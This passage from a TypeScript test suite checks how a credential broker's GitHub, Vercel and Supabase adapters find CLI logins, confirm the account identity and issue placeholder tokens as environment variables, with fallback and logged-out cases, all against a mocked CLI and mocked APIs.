    );
  });

  it('github: gh auth status accounts, gh auth token per use (with --user fallback), login identity must match', async () => {
    const status = [
      'github.com',
      '  ✓ Logged in to github.com account nic (keyring)',
      '  - Active account: true',
      "  - Token scopes: 'repo', 'workflow'",
      '',
      '  ✓ Logged in to github.com account acme-bot (GH_TOKEN)',
      '  - Active account: false',
    ].join('\n');
    const cli = new FakeCliRunner()
      .install('gh')
      .on('gh', ['--version'], {
        stdout: 'gh version 2.45.0 (2024-03-04)\nhttps://github.com/cli/cli/releases/tag/v2.45.0',
      })
      .on('gh', ['auth', 'status'], { stdout: status })
      .on('gh', ['auth', 'token', '--hostname', 'github.com', '--user', 'nic'], {
        stdout: 'gho_fixturetoken\n',
      })
      .on('gh', ['auth', 'token', '--hostname', 'github.com', '--user', 'acme-bot'], {
        stdout: 'gho_bottoken\n',
      });
    const d = deps(
      {
        'https://api.github.com/user': (init) =>
          jsonResponse({
            login: String((init?.headers as Record<string, string>)['Authorization']).includes('bottoken')
              ? 'acme-bot'
              : 'nic',
          }),
      },
      cli,
    );
    const gh = new GitHubAdapter(d, undefined);
    expect(await gh.cliStatus()).toEqual({
      installed: true,
      binary: '/usr/local/bin/gh',
      version: '2.45.0',
      loginCommand: 'gh auth login --web',
      accounts: [
        { id: 'nic', label: 'nic', active: true, detail: 'scopes repo, workflow' },
        { id: 'acme-bot', label: 'acme-bot', active: false, detail: 'github.com' },
      ],
    });
    const c = await gh.connect(
      { method: 'cli', account: 'nic', config: { owner: 'acme', repo: 'shop' } },
      't1',
    );
    expect(c).toEqual({
      credentialRef: 'styx:v1:github:t1:cli',
      config: { owner: 'acme', repo: 'shop', login: 'nic', account: 'nic' },
      label: 'GitHub acme/shop',
    });
    expect(await d.vault.get(c.credentialRef)).not.toContain('gho_');
    const t = target({ credentialRef: c.credentialRef, config: c.config });
    expect(await gh.issue(grant, t)).toEqual({
      kind: 'env',
      env: { GH_TOKEN: 'gho_fixturetoken', GITHUB_TOKEN: 'gho_fixturetoken' },
      expiresAt: grant.expiresAt,
      scoped: false,
    });
    expect(await gh.pushToken(t)).toBe('gho_fixturetoken');
    expect(await gh.health(t)).toEqual({ ok: true, identity: 'nic' });
    await expect(
      gh
        .connect({ method: 'cli', account: 'nic', config: {} }, 't2')
        .then(() => gh.connect({ method: 'cli', account: 'Nic-Other', config: {} }, 't2')),
    ).rejects.toThrow(/not found on PATH|no fake response|holds a token/);
    // Older gh without `--user`: fall back to the active account's token.
    cli
      .on('gh', ['auth', 'token', '--hostname', 'github.com', '--user'], {
        exitCode: 1,
        stderr: 'unknown flag: --user',
      })
      .on('gh', ['auth', 'token', '--hostname', 'github.com'], { stdout: 'gho_fixturetoken\n' });
    expect(await gh.issue(grant, t)).toMatchObject({ env: { GH_TOKEN: 'gho_fixturetoken' } });
    // Logged out: minting fails → expired.
    cli.on('gh', ['auth', 'token'], { exitCode: 1, stderr: 'no oauth token found for github.com' });
    expect(await gh.health(t)).toEqual({
      ok: false,
      expired: true,
      error: 'gh: no oauth token found for github.com',
    });
  });

  it('vercel: token from the CLI store (read-only), whoami identity, missing store → expired', async () => {
    const authPath = '/Users/test/Library/Application Support/com.vercel.cli/auth.json';
    const cli = new FakeCliRunner()
      .install('vercel')
      .on('vercel', ['--version'], { stdout: 'Vercel CLI 33.5.1\n33.5.1' })
      .on('vercel', ['whoami'], { stdout: '> Vercel CLI 33.5.1\nnic\n' })
      .file(authPath, JSON.stringify({ token: 'vc_fixture' }));
    const d = deps(
      { 'https://api.vercel.com/v2/user': () => jsonResponse({ user: { username: 'nic' } }) },
      cli,
    );
    const v = new VercelAdapter(d);
    expect(await v.cliStatus()).toEqual({
      installed: true,
      binary: '/usr/local/bin/vercel',
      version: '33.5.1',
      loginCommand: 'vercel login',
      accounts: [{ id: 'nic', label: 'nic', active: true }],
    });
    expect(v.cliLoginCommand()).toEqual({ bin: 'vercel', args: ['login'] });
    const c = await v.connect({ method: 'cli', account: 'nic', config: { teamId: 'team_1' } }, 't1');
    expect(c).toEqual({
      credentialRef: 'styx:v1:vercel:t1:cli',
      config: { teamId: 'team_1', username: 'nic', account: 'nic' },
      label: 'Vercel',
    });
    expect(await d.vault.get(c.credentialRef)).not.toContain('vc_fixture');
    const t = target({ provider: 'vercel', credentialRef: c.credentialRef, config: c.config });
    expect(await v.issue(grant, t)).toMatchObject({
      env: { VERCEL_TOKEN: 'vc_fixture', VERCEL_ORG_ID: 'team_1' },
      scoped: false,
    });
    await expect(v.connect({ method: 'cli', account: 'someone-else' }, 't2')).rejects.toThrow(
      /logged in as nic/,
    );
    cli.files.delete(authPath);
    expect(await v.health(t)).toEqual({
      ok: false,
      expired: true,
      error: 'vercel CLI is not logged in (run `vercel login`)',
    });
    expect((await v.cliStatus()).accounts).toEqual([]);
  });

  it('supabase: ~/.supabase/access-token or projects list, token read per use', async () => {
    const cli = new FakeCliRunner()
      .install('supabase')
      .on('supabase', ['--version'], { stdout: '1.165.0' })
      .on('supabase', ['projects', 'list'], { stdout: JSON.stringify([{ id: 'abcd1234', name: 'acme' }]) })
      .file('/Users/test/.supabase/access-token', 'sbp_fixture\n');
    const d = deps(
      { 'https://api.supabase.com/v1/projects': () => jsonResponse([{ id: 'abcd1234', name: 'acme' }]) },
      cli,
    );
    const s = new SupabaseAdapter(d);
    expect(await s.cliStatus()).toEqual({
      installed: true,
      binary: '/usr/local/bin/supabase',
      version: '1.165.0',
      loginCommand: 'supabase login',
      accounts: [{ id: 'cli', label: 'supabase CLI login', active: true, detail: '1 project' }],
    });
    const c = await s.connect({ method: 'cli', account: 'cli' }, 't1');
    expect(c).toEqual({
      credentialRef: 'styx:v1:supabase:t1:cli',
      config: { ref: 'abcd1234', account: 'cli' },
      label: 'Supabase',
    });
    expect(await d.vault.get(c.credentialRef)).not.toContain('sbp_');
    const t = target({ provider: 'supabase', credentialRef: c.credentialRef, config: c.config });
    expect(await s.issue(grant, t)).toMatchObject({
      env: { SUPABASE_ACCESS_TOKEN: 'sbp_fixture', SUPABASE_PROJECT_REF: 'abcd1234' },
      scoped: false,
    });
    expect(await s.health(t)).toEqual({ ok: true, identity: '1 projects' });
    cli.files.delete('/Users/test/.supabase/access-token');
    cli.keychain.clear();
    expect(await s.health(t)).toEqual({
      ok: false,
      expired: true,
      error: 'supabase CLI is not logged in (run `supabase login`)',
    });
    cli.keychain.set('Supabase CLI\u0000access-token', 'sbp_keyring');
    expect(await s.issue(grant, t)).toMatchObject({ env: { SUPABASE_ACCESS_TOKEN: 'sbp_keyring' } });
  });

  it('ssh has no cli mode; the registry still routes every tool', () => {
    const r = new ProviderRegistry(deps({}));
    expect(r.get('ssh').cliStatus).toBeUndefined();
    for (const p of ['gcp', 'aws', 'github', 'vercel', 'supabase'] as const)
      expect(typeof r.get(p).cliStatus).toBe('function');
  });
});
